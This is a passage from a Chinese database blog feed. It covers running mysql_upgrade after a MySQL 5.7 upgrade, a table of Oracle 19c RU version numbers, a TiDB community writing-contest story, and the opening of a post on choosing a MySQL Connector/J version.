<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Updated:</span><br><span class="line">  mysql-community-client.x86_64 0:5.7.19-1.el7                             </span><br><span class="line">  mysql-community-common.x86_64 0:5.7.19-1.el7                             </span><br><span class="line">  mysql-community-devel.x86_64 0:5.7.19-1.el7                              </span><br><span class="line">  mysql-community-embedded.x86_64 0:5.7.19-1.el7                           </span><br><span class="line">  mysql-community-embedded-compat.x86_64 0:5.7.19-1.el7                    </span><br><span class="line">  mysql-community-embedded-devel.x86_64 0:5.7.19-1.el7                     </span><br><span class="line">  mysql-community-libs.x86_64 0:5.7.19-1.el7                               </span><br><span class="line">  mysql-community-libs-compat.x86_64 0:5.7.19-1.el7                        </span><br><span class="line">  mysql-community-server.x86_64 0:5.7.19-1.el7                             </span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<p>安装完成，启动新版本的 MySQL 服务。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure></div>
<p>登陆数据库，查看用户列表。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select user from mysql.user;</span><br><span class="line">+-----------+</span><br><span class="line">| user      |</span><br><span class="line">+-----------+</span><br><span class="line">| mysql.sys |</span><br><span class="line">| root      |</span><br><span class="line">+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>可以看到，<code>mysql.session</code> 用户尚未被添加到数据库中。</p>
<p>这里我们开启 general 日志，来观察升级命令都执行了哪些 SQL。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%gen%&#x27;;</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">| general_log      | ON                          |</span><br><span class="line">| general_log_file | /var/lib/mysql/shawnyan.log |</span><br><span class="line">+------------------+-----------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>下一步，运行 mysql_upgrade 命令。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_upgrade</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 07:42:50]$ mysql_upgrade -uroot -p</span><br><span class="line">Checking if update is needed.</span><br><span class="line">Checking server version.</span><br><span class="line">Running queries to upgrade MySQL server.</span><br><span class="line">Checking system database.</span><br><span class="line">mysql.columns_priv                                 OK</span><br><span class="line">mysql.db                                           OK</span><br><span class="line">mysql.engine_cost                                  OK</span><br><span class="line">mysql.event                                        OK</span><br><span class="line">mysql.func                                         OK</span><br><span class="line">mysql.general_log                                  OK</span><br><span class="line">mysql.gtid_executed                                OK</span><br><span class="line">mysql.help_category                                OK</span><br><span class="line">mysql.help_keyword                                 OK</span><br><span class="line">mysql.help_relation                                OK</span><br><span class="line">mysql.help_topic                                   OK</span><br><span class="line">mysql.innodb_index_stats                           OK</span><br><span class="line">mysql.innodb_table_stats                           OK</span><br><span class="line">mysql.ndb_binlog_index                             OK</span><br><span class="line">mysql.plugin                                       OK</span><br><span class="line">mysql.proc                                         OK</span><br><span class="line">mysql.procs_priv                                   OK</span><br><span class="line">mysql.proxies_priv                                 OK</span><br><span class="line">mysql.server_cost                                  OK</span><br><span class="line">mysql.servers                                      OK</span><br><span class="line">mysql.slave_master_info                            OK</span><br><span class="line">mysql.slave_relay_log_info                         OK</span><br><span class="line">mysql.slave_worker_info                            OK</span><br><span class="line">mysql.slow_log                                     OK</span><br><span class="line">mysql.tables_priv                                  OK</span><br><span class="line">mysql.time_zone                                    OK</span><br><span class="line">mysql.time_zone_leap_second                        OK</span><br><span class="line">mysql.time_zone_name                               OK</span><br><span class="line">mysql.time_zone_transition                         OK</span><br><span class="line">mysql.time_zone_transition_type                    OK</span><br><span class="line">mysql.user                                         OK</span><br><span class="line">The sys schema is already up to date (version 1.5.1).</span><br><span class="line">Checking databases.</span><br><span class="line">sys.sys_config                                     OK</span><br><span class="line">Upgrade process completed successfully.</span><br><span class="line">Checking if update is needed.</span><br></pre></td></tr></table></figure></div>
<p>通过 general 日志，可以看到 <code>mysql.session</code> 用户被写入用户表。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~ 07:43:42]$ grep &#x27;mysql.session&#x27; /var/lib/mysql/shawnyan.log</span><br><span class="line">2024-03-15T23:43:09.277088Z	    6 Query	SELECT COUNT(*) FROM mysql.user WHERE user = &#x27;mysql.session&#x27;</span><br><span class="line">2024-03-15T23:43:10.888664Z	    6 Query	INSERT IGNORE INTO mysql.user VALUES (&#x27;localhost&#x27;,&#x27;mysql.session&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;Y&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,0,0,0,0,&#x27;mysql_native_password&#x27;,&#x27;*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE&#x27;,&#x27;N&#x27;,CURRENT_TIMESTAMP,NULL,&#x27;Y&#x27;)</span><br><span class="line">2024-03-15T23:43:10.889540Z	    6 Query	INSERT IGNORE INTO mysql.tables_priv VALUES (&#x27;localhost&#x27;, &#x27;mysql&#x27;, &#x27;mysql.session&#x27;, &#x27;user&#x27;, &#x27;root\@localhost&#x27;, CURRENT_TIMESTAMP, &#x27;Select&#x27;, &#x27;&#x27;)</span><br><span class="line">2024-03-15T23:43:10.890429Z	    6 Query	INSERT IGNORE INTO mysql.db VALUES (&#x27;localhost&#x27;, &#x27;performance_schema&#x27;, &#x27;mysql.session&#x27;,&#x27;Y&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;,&#x27;N&#x27;)</span><br><span class="line">[root@shawnyan ~ 07:44:02]$ </span><br></pre></td></tr></table></figure></div>
<p>再次登陆数据库，查看用户列表，确认新用户已经添加成功。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> version();</span></span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.19    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> user from mysql.user;</span></span><br><span class="line">+---------------+</span><br><span class="line">| user          |</span><br><span class="line">+---------------+</span><br><span class="line">| mysql.session |</span><br><span class="line">| mysql.sys     |</span><br><span class="line">| root          |</span><br><span class="line">+---------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="mysql-upgrade-废弃">mysql_upgrade 废弃</h2>
<p>不过，从 MySQL 8.0.16 开始， mysql_upgrade 被废弃，并将从未来的版本中移除。</p>
<p>DBA 不再需要额外地手动调用 mysql_upgrade 来进行升级操作。</p>
<p>取而代之的是，服务器新增了 <code>--upgrade</code> 选项，默认值为 <code>AUTO</code>，</p>
<p>服务器会自行判断是否需要升级，如需要会在启动时自动执行升级操作。</p>
<p>如果执行 mysql_upgrade 命令，会输出下面一段信息：</p>
<blockquote>
<p>The mysql_upgrade client is now deprecated. The actions executed by the upgrade client are now done by the server.<br>
To upgrade, please start the new MySQL binary with the older data directory. Repairing user tables is done automatically. Restart is not required after upgrade.<br>
The upgrade process automatically starts on running a new MySQL binary with an older data directory. To avoid accidental upgrades, please use the --upgrade=NONE option with the MySQL binary. The option --upgrade=FORCE is also provided to run the server upgrade sequence on demand.<br>
It may be possible that the server upgrade fails due to a number of reasons. In that case, the upgrade sequence will run again during the next MySQL server start. If the server upgrade fails repeatedly, the server can be started with the --upgrade=MINIMAL option to start the server without executing the upgrade sequence, thus allowing users to manually rectify the problem.</p>
</blockquote>
<h2 id="总结">总结</h2>
<p>总的来说，在 MySQL 8.0.16 之前，mysql_upgrade 是一个功能强大且实用的工具，它能够帮助用户平滑地过渡到新版本的 MySQL。</p>
<p>随着 MySQL 版本的不断更新和升级，mysql_upgrade 的功能已经内嵌到 MySQL 服务器，其也将伴随 MySQL 5.7 逐步退出历史舞台。</p>
<p>– END –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>MySQL 8.0</category>
      </categories>
      <tags>
        <tag>upgrade</tag>
        <tag>mysql</tag>
        <tag>mysql 5.7</tag>
        <tag>mysql 8.0</tag>
      </tags>
  </entry>
  <entry>
    <title>Oracle 19c RU 版本号速查表</title>
    <url>/2024/oracle/oracle-ru-version-list/</url>
    <content><![CDATA[<p>Oracle 的 RU（Release Updates） 更新策略是 Oracle 数据库软件的一个重要组成部分，它涉及到数据库软件的维护和升级。</p>
<h2 id="Oracle-数据库有两种维护策略：">Oracle 数据库有两种维护策略：</h2>
<h3 id="反应性补丁">反应性补丁</h3>
<p>解决特定的维护问题。特点包括：</p>
<ul>
<li>通常作为单独的补丁分发。</li>
<li>以前称为一次性补丁。</li>
<li>根据特定缺陷、版本和平台组合的需求提供。</li>
<li>进行基本的健康测试。</li>
<li>某些反应性修复可能会包含在未来的版本更新中。</li>
</ul>
<h3 id="主动修补">主动修补</h3>
<p>向所有 Oracle 数据库客户提供建议的更新。特点包括：</p>
<ul>
<li>解决影响特定配置的高影响力错误。</li>
<li>包含经过验证的低风险修复。</li>
<li>包含以前累积的修复。</li>
<li>需接受由补丁影响的功能决定的额外测试级别。</li>
<li>单击“补丁和更新”选项卡可在 My Oracle Support 上找到。</li>
<li>以版本更新 (RU) 和每月推荐补丁 (MRP) 形式提供。</li>
</ul>
<h2 id="Oracle-RU-更新策略介绍">Oracle RU 更新策略介绍</h2>
<h3 id="历史背景">历史背景</h3>
<p>在 Oracle 12c 发布之前，Oracle 数据库的升级周期大约是每5年发布一个大版本，<br>
在这个大版本上进行小的升级，这些小升级被称为 Patchset Update (PSU) 和 Database Bundle Patch (DBBP)。<br>
然而，随着12c的发布，Oracle改变了其数据库产品的发布周期，每年发布新的大版本，<br>
并且引入了新的升级策略，即 RU（Release Updates） 和 RUR（Release Update Revisions）。</p>
<h3 id="RU（Release-Updates）">RU（Release Updates）</h3>
<p>定义：RU是Oracle每个季度发布的数据库版本升级，包含最新的BUG修复、安全漏洞补丁以及新添加的功能。<br>
内容：RU包括对数据库软件的改进，如查询优化器的错误修复、性能提升、新特性的引入等。它们经过广泛的测试，包括功能测试、压力测试、性能测试和破坏性测试。<br>
应用建议：Oracle推荐客户保持应用最新的RU，以避免已知问题，并减少补丁维护的操作。对于新安装的数据库，推荐安装最新的RU版本。</p>
<h3 id="RUR（Release-Update-Revisions）">RUR（Release Update Revisions）</h3>
<p>定义：RUR是对RU的修订版本，每个季度也会发行，包含对RU的回退修复以及最新的安全方面的修复。<br>
内容：RUR不包含新功能，主要是对RU中功能的稳定性和安全性进行增强。<br>
应用建议：对于已经达到稳定状态的数据库，客户可能会选择优先考虑安全更新而不是功能修复，这时可以选择应用RUR。<br>
RUR允许客户采取更保守的方法来进行数据库软件维护，但仍然可能会遇到已在最新RU中包含的已知问题。</p>
<h3 id="切换策略">切换策略</h3>
<p>灵活性：客户可以在Updates和Revisions之间来回切换，但新的patch必须是之前patch的超集，以避免补丁冲突。<br>
一致性：为了避免补丁冲突，建议客户坚持一贯的政策，即在每季维护周期中始终采用相同的Revision级别。</p>
<h3 id="注意事项">注意事项</h3>
<p>版本兼容性：从12.2.0.1数据库软件以及更新的版本开始，Update和Revision策略取代了之前的PSU和DBBP策略。<br>
但是，数据库版本12.1和11.2仍然会每季度发布PSUs和BPs。<br>
终止RUR：从2022年10月开始，19.17.0及以上版本将不再提供19c RUR。<br>
在2023年1月Oracle Database 19c RUR 19.16.2发布后，任何平台上都不会发布额外的RUR。</p>
<h2 id="RU-版本号速查表">RU 版本号速查表</h2>
<p>当前最新版本为 Oracle 19.22.0，具体版本号信息如下。</p>
<table>
<thead>
<tr>
<th><strong>Date</strong></th>
<th><strong>版本号</strong></th>
<th><strong>版本更新 (RU)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>2024 年 1 月</td>
<td>19.22.0</td>
<td>19.0.0.0.ru-2024-01.rur-2024-01.r1</td>
</tr>
<tr>
<td>2023 年 10 月</td>
<td>19.21.0</td>
<td>19.0.0.0.ru-2023-10.rur-2023-10.r1</td>
</tr>
<tr>
<td>2023 年 7 月</td>
<td>19.20.0</td>
<td>19.0.0.0.ru-2023-07.rur-2023-07.r1</td>
</tr>
<tr>
<td>2023 年 4 月</td>
<td>19.19.0</td>
<td>19.0.0.0.ru-2023-04.rur-2023-04.r1</td>
</tr>
<tr>
<td>2023 年 1 月</td>
<td>19.18.0</td>
<td>19.0.0.0.ru-2023-01.rur-2023-01.r2/r1</td>
</tr>
<tr>
<td>2022 年 10 月</td>
<td>19.17.0</td>
<td>19.0.0.0.ru-2022-10.rur-2022-10.r1</td>
</tr>
<tr>
<td>2022 年 7 月</td>
<td>19.16.0</td>
<td>19.0.0.0.ru-2022-07.rur-2022-07.r1</td>
</tr>
<tr>
<td>2022 年 4 月</td>
<td>19.15.0</td>
<td>19.0.0.0.ru-2022-04.rur-2022-04.r1</td>
</tr>
<tr>
<td>2022 年 1 月</td>
<td>19.14.0</td>
<td>19.0.0.0.ru-2022-01.rur-2022-01.r1</td>
</tr>
<tr>
<td>2021 年 10 月</td>
<td>19.13.0</td>
<td>19.0.0.0.ru-2021-10.rur-2021-10.r1</td>
</tr>
<tr>
<td>2021 年 7 月</td>
<td>19.12.0</td>
<td>19.0.0.0.ru-2021-07.rur-2021-07.r1</td>
</tr>
<tr>
<td>2021 年 4 月</td>
<td>19.11.0</td>
<td>19.0.0.0.ru-2021-04.rur-2021-04.r1</td>
</tr>
<tr>
<td>2021 年 1 月</td>
<td>19.10.0</td>
<td>19.0.0.0.ru-2021-01.rur-2021-01.r2 /r1</td>
</tr>
<tr>
<td>2020 年 10 月</td>
<td>19.9.0</td>
<td>19.0.0.0.ru-2020-10.rur-2020-10.r1</td>
</tr>
<tr>
<td>2020 年 7 月</td>
<td>19.8.0</td>
<td>19.0.0.0.ru-2020-07.rur-2020-07.r1</td>
</tr>
<tr>
<td>2020 年 4 月</td>
<td>19.7.0</td>
<td>19.0.0.0.ru-2020-04.rur-2020-04.r1</td>
</tr>
<tr>
<td>2020 年 1 月</td>
<td>19.6.0</td>
<td>19.0.0.0.ru-2020-01.rur-2020-01.r1</td>
</tr>
<tr>
<td>2019 年 10 月</td>
<td>19.5.0</td>
<td>19.0.0.0.ru-2019-10.rur-2019-10.r1</td>
</tr>
<tr>
<td>2019 年 7 月</td>
<td>19.4.0</td>
<td>19.0.0.0.ru-2019-07.rur-2019-07.r1</td>
</tr>
</tbody>
</table>
<h2 id="Ref">Ref</h2>
<ul>
<li><a class="link"   href="https://docs.oracle.com/cd/E82638_01/dbptc/index.html#GUID-598984C3-B4A7-4A1A-8526-867ECF4EDAA5" >https://docs.oracle.com/cd/E82638_01/dbptc/index.html#GUID-598984C3-B4A7-4A1A-8526-867ECF4EDAA5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>– END. –</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
<p>如果这篇文章为你带来了灵感或启发，就帮忙点『赞』or『在看』or『转发』吧，这对我非常重要，感谢！(๑˃̵ᴗ˂̵)</p>
]]></content>
      <categories>
        <category>Oracle</category>
        <category>19c</category>
      </categories>
      <tags>
        <tag>oracle</tag>
        <tag>ocp</tag>
        <tag>oracle 19c</tag>
        <tag>ocm</tag>
      </tags>
  </entry>
  <entry>
    <title>【我和 TiDB 社区的故事】我与 TiDB 专栏的故事</title>
    <url>/2024/tidb/tidb-story-with-tidb-blog/</url>
    <content><![CDATA[<h2 id="两年前">两年前</h2>
<p>两年前，2022 年初，TiDB 社区专栏上线，将原 AskTUG 论坛的“技术文章”统一迁移至专栏板块，TiDB 社区专栏板块旨在让技术人员成为更好的读者、作家。</p>
<p>截止至 2022.02.07，有 137 位社区技术布道师贡献了 497 篇技术文章。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<p>涵盖了用户案例、最佳实践、技术经验分享、故障分析案例等几大主题。</p>
<p>同年 3 月 14 日，TiDB 社区专栏第一届征文大赛，正式启动。</p>
<p>正值 TiDB 6.0 发版，整个大赛过程各位布道师输出了诸多 TiDB 6.0 相关文章。</p>
<p>首届征文大赛截至 5 月 31 日，活动共有 45 位小伙伴参与，有 103 篇优质文章输出。<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>经过对优质文章的精心整理和优化改进，最终发布了《TiDB 6.x in Action》电子书。<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup></p>
<p>…</p>
<p>于我个人而言，那时刚刚考完 PCTP v5 认证，对 TiDB 也有了较为初步、概括性的了解。</p>
<p>于是抽出大量业余时间，全程参与了整个活动，凌晨写稿、改稿、校稿亦是家常便饭。</p>
<p>在此次活动中，共入围 5 篇文章，其中 1 篇获得三等奖，1 篇获得最佳人气奖。</p>
<p>本次赛事共收获了 3 个奖牌，社区徽章，及 TiDB 周边若干。</p>
<p>同时，有幸遇此，结识了很多技术大咖，在文章审校、电子书编辑过程中，也对 TiDB 有了更多的理解。</p>
<p>与 TiDB 社区的诸位“亲戚”的相逢，让我 get 到了开源社区可以这样丰富多彩。</p>
<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2024-03-03_222014-1709527907034.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="一年前">一年前</h2>
<p>23 年春，3/1 ~ 5/31，TiDB 社区第二届征文大赛，如期举办。</p>
<p>本次活动共收到了 29 位 TiDBer 的 58 篇文章，其中有 10 位 Ti 高手贡献超过 2 篇文章。</p>
<p>这里可以看到文章合集：<a class="link"   href="https://asktug.com/t/topic/1007874#h-1" >https://asktug.com/t/topic/1007874#h-1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>经过多轮评选，活动最终产生一等奖 1 名，二等奖 3 名，三等奖 5 名，</p>
<p>以及 “书山有路勤为径” 勤奋奖 1 名，最佳人气奖 4 名。<sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup></p>
<p>…</p>
<p>实属遗憾，我在活动开始前病倒，一个多月的调理才逐渐恢复。</p>
<p>后又因事情累计太多，确实无暇参与大赛。</p>
<h2 id="2-个月前">2 个月前</h2>
<p>从 Billmay 的总结贴中了解到，从 2019 年到目前，累计社区布道师 262 名，累计发布文章数：1118 篇。</p>
<p>2023 年一共有 83 位小伙伴贡献了 295 篇技术文章。<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup></p>
<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2024-03-03_173653-1709527943700.png"
                      referrerpolicy="no-referrer"
                >
<p>…</p>
<p>从专栏上线到现在，我一共发布了 24 篇文章。并喜提 3 枚创作勋章。</p>
<p>再接再厉，争取早日拿下 50 篇文章的奖励徽章。</p>
<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/2024-03-03_182136-1709527924116.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="Now">Now</h2>
<p>伴随 TiDB 的成长，TiDB v6.5 / v7.5 稳定性加固，对 MySQL 8.0 的全面兼容，</p>
<p>专栏新增了诸多生产案例、排障分析和技术内幕等方面的文章分享，</p>
<p>无论读者是数据库新兵，还是初学 TiDB，亦或对 TiDB 有较丰富的使用经验，都可以在这里“继续学习”。</p>
<p>2024 年 3 月，<strong>TiDB 社区第三届专栏征文大赛</strong>，已经上线，本次征文活动提供了如下这些主题以供写作方向参考。</p>
<ol>
<li>
<p>TiDB 新版本的应用（包括新功能和新特性的应用）：如 v6.5.x 、7.1.x、7.5.x 、8.x （预计 3月底上线）的新版本试用及应用，介绍您的使用体验及新版本带来的诸多新特性应用测评；</p>
</li>
<li>
<p>TiDB 的行业实践：在零售、金融、互联网+、SaaS、出海、游戏、医疗、教育等行业的 TiDB 实践分享；</p>
</li>
<li>
<p>TiDB 的降本增效方案：如何使用 TiDB 帮助业务和公司降本增效；</p>
</li>
<li>
<p>AI + TiDB：TiDB 和 AI 结合的场景和应用实践分享；</p>
</li>
<li>
<p>国产化改造：运用 TiDB 进行国产化改造实践分享；</p>
</li>
<li>
<p>数据库迁移实战：从 db2、oracle、MySQL、MongoDB、OceanBase、PostgreSQL、SQLServer、MariaDB 到 TiDB 的迁移实践与产品收益分享；</p>
</li>
<li>
<p>TiDB 的性能优化和调优技巧：分享您在使用 TiDB 时遇到的性能问题以及如何通过优化来提升系统性能的经验；</p>
</li>
<li>
<p>TiDB 原理解读及分析：分析解读 TiDB 各个组件如 TiFlash、TiKV、dm、TiUP 及各个功能、特性的原理；</p>
</li>
<li>
<p>TiDB 的稳定性表现：可以测试 TiDB 在稳定性上的表现，分析是否符合预期，也可以给产品提提建议。</p>
</li>
<li>
<p>数据库场景化架构方案设计：分享你在使用 TiDB 的过程中如何进行数据库架构调整以及调整后收益！</p>
</li>
<li>
<p>我和 TiDB 社区的故事：你和 TiDB 社区之间有哪些值得分享的故事？</p>
</li>
</ol>
<p>除了获奖三件套（奖杯+荣誉徽章+社区积分），本次活动还有诸多 2024 年新款周边在等你。</p>
<img  alt="img01.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/3a11b4d038ce7d8c36457fc38d3101ddb7c38456-1709527956487.jpeg"
                      referrerpolicy="no-referrer"
                >
<p>补充一点，TiDB 社区有两项荣誉称号，MVA 和 MOA。</p>
<ul>
<li>
<p>MVA 是在一年内（自然年）为 TiDB 社区多维贡献数量达到 5 个及以上或者优质贡献（Ti能说+Ti能写）达到3个以上，通过布道师组委会评审后，即可当选 TiDB 社区年度 MVA。</p>
</li>
<li>
<p>MOA 是在一年内（自然年）为 TiDB 社区多维贡献数量达到 10 个及以上，通过布道师组委会评审后，即可当选 TiDB 社区年度 MOA。</p>
</li>
</ul>
<p>当然，本次征文活动的文章也会统计到社区贡献中。</p>
<p>同时，一篇文章最多可获得 600 积分&amp;经验值，积分可兑换 TiDB 周边，及认证兑换码。</p>
<p>TiDB 社区专栏投稿入口：<a class="link"   href="https://tidb.net/blog/new/edit" >https://tidb.net/blog/new/edit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>期待，与你在 TiDB 社区专栏相遇。</p>
<h2 id="推荐阅读">推荐阅读</h2>
<ul>
<li>阮一峰老师的【中文技术文档的写作规范】：<a class="link"   href="https://github.com/ruanyf/document-style-guide" >https://github.com/ruanyf/document-style-guide <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>【我和 TiDB 的故事】这里集齐了 34 位社区小伙伴和 TiDB 的故事：<a class="link"   href="https://asktug.com/t/topic/994906" >https://asktug.com/t/topic/994906 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                ><hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://tidb.net/blog/e9d33557" >https://tidb.net/blog/e9d33557 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn2" class="footnote-item"><p><a class="link"   href="https://tidb.net/blog/d60bd7f8" >https://tidb.net/blog/d60bd7f8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn3" class="footnote-item"><p><a class="link"   href="https://tidb.net/book/book-rush" >https://tidb.net/book/book-rush <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn4" class="footnote-item"><p><a class="link"   href="https://asktug.com/t/topic/1007874" >https://asktug.com/t/topic/1007874 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</li>
<li id="fn5" class="footnote-item"><p><a class="link"   href="https://asktug.com/t/topic/1020038#tidber-7" >https://asktug.com/t/topic/1020038#tidber-7 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>TiDB</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
        <tag>tidb blog</tag>
      </tags>
  </entry>
  <entry>
    <title>如何选择适合的 MySQL Connector/J 版本</title>
    <url>/2024/mysql/mysql-connector-j-8-x/</url>
    <content><![CDATA[<img  alt="mysql_girl.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240229-107b6e8c-3daf-4513-b487-cccda385dc8a.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="TL-DL">TL;DL</h2>
<p>如果你正在使用 MySQL 8.0 及以上版本或者兼容 MySQL 8.0 的数据库，推荐选择 MySQL Connector/J 8.3.0 版本。</p>
<h2 id="MySQL-Connector-J">MySQL Connector/J</h2>
<p>MySQL Connector/J 是 MySQL 官方提供的用于 Java 应用程序连接 MySQL 数据库的 JDBC 驱动。它支持 JDBC 4.2 API，并实现了 X DevAPI。</p>
<p>在选择用于生产环境的 MySQL Connector/J 版本时，需要考虑多个因素，以确保与你的项目需求和环境兼容性。本文将从 MySQL 服务器版本、Java 版本、JDBC 版本、TLS 版本、特性支持、生命周期等几个方面来讨论如何选择适合的 MySQL Connector/J 版本。</p>
<h3 id="1-MySQL-服务器版本">1. MySQL 服务器版本</h3>
<p>如果你的 MySQL 服务器版本为 8.0，甚至已经在用 MySQL 8.3，建议选择 MySQL Connector/J 8.3。</p>
<p>如果你的 MySQL 服务器版本为 5.5，5.6，5.7，或 8.0，可以选择 MySQL Connector/J 5.1，需要注意的是，对于 MySQL 5.7 服务器，需要选择 MySQL Connector/J 5.1.37 及以上版本。</p>
<p>另外，MySQL 5.5,5.6,5.7 已经 EOL，建议升级到 MySQL 8.0 最新小版本，即 MySQL 8.0.35 或 8.0.36。</p>
<p>如果你的 MySQL 服务器版本为更古早的版本，you would better keep it with current setting.</p>
<p>确保所选的驱动版本与你的 MySQL 服务器版本兼容，以避免连接或性能问题。</p>
<h3 id="2-Java-版本">2. Java 版本</h3>
<p>MySQL Connector/J 8.3 支持 JRE/JDK 8 及以上版本。</p>
<p>MySQL Connector/J 5.1 支持 JRE/JDK 5 及以上版本。</p>
<p>如果你的项目用到了 Java，那么应该选择 JDK 8 及以上版本。</p>
<h3 id="3-JDBC-API">3. JDBC API</h3>
<p>JDBC（Java Database Connectivity）API 版本也可以作为选择驱动时的考虑因素。</p>
<p>MySQL Connector/J 8.3 支持 JDBC 4.2 API。</p>
<p>MySQL Connector/J 5.1 从 5.1.37 版本开始支持 JDBC 4.2 API。</p>
<h3 id="4-TLS-版本">4. TLS 版本</h3>
